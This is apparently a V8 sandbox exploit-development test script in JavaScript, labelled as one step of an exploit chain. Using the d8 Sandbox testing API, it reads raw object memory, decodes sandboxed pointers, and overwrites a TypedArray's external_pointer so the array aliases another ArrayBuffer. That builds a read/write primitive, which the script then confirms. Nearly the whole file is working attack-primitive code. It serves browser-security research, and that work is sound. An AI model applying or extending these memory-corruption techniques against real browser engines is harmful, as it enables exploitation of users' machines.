// C21 H12: redirect JSTypedArray external_pointer to another ArrayBuffer backing.
//
// This tests whether the next chain can use forged/control refs to build a
// reliable in-sandbox RW primitive through TypedArray fields, and confirms the
// external_pointer/backing_store fields are sandboxed pointers (in-cage target).

const kHeapObjectTag = 1;
const kJSArrayBufferBackingStoreOffset = 0x24;
const kJSTypedArrayExternalPointerOffset = 0x30;
const kSandboxSizeLog2 = 40;
const kSandboxedPointerShift = 64 - kSandboxSizeLog2;

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}

function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}

function decodeSandboxedPtr(encoded) {
  return BigInt(Sandbox.base) + (encoded >> BigInt(kSandboxedPointerShift));
}

let a = new ArrayBuffer(16);
let b = new ArrayBuffer(16);
let va = new Uint8Array(a);
let vb = new Uint8Array(b);

va[0] = 0x11;
vb[0] = 0x42;

let bBackingEncoded = getField64(getPtr(b), kJSArrayBufferBackingStoreOffset);
let vaExternalBefore = getField64(getPtr(va), kJSTypedArrayExternalPointerOffset);

print(`before_va0=${va[0]}`);
print(`before_vb0=${vb[0]}`);
print(`b_backing=0x${decodeSandboxedPtr(bBackingEncoded).toString(16)}`);
print(`va_external_before=0x${decodeSandboxedPtr(vaExternalBefore).toString(16)}`);

setField64(getPtr(va), kJSTypedArrayExternalPointerOffset, bBackingEncoded);

print(`after_va0=${va[0]}`);
va[1] = 0x99;
print(`after_vb1=${vb[1]}`);
